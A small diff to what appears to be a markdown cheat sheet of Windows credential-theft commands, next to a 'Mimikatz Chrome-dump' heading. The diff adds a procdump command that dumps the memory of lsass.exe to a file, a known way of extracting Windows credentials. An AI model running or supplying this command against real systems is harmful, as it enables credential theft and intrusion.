@@ -5,7 +5,9 @@
   </body>
 </p>
 
-
+````
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+````
 ## Mimikatz Chrome-dump
 
 ````
